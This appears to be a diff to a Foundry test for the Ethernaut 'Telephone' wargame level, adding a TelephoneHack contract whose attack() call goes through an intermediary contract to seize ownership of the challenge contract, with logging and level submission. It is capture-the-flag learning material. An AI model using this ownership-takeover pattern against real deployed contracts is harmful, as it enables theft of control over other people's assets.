@@ -28,7 +28,10 @@ contract TelephoneTest is Test {
         /****************
          *    Attack     *
          *************** */
-
+        TelephoneHack telephoneHack = new TelephoneHack(levelAddress);
+        console.log("TelephoneHack address: %s", address(telephoneHack));
+        telephoneHack.attack();
+        console.log("Telephone owner: %s", ethernautTelephone.owner());
         /*****************
          *Level Submission*
          ***************  */
@@ -37,5 +40,19 @@ contract TelephoneTest is Test {
         );
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+    }
+}
+
+contract TelephoneHack {
+    Telephone public challenge;
+
+    // -- 1 --
+    constructor(address challengeAddress) {
+        challenge = Telephone(payable(challengeAddress));
+    }
+
+    // -- 2 --
+    function attack() public {
+        challenge.changeOwner(msg.sender);
     }
 }
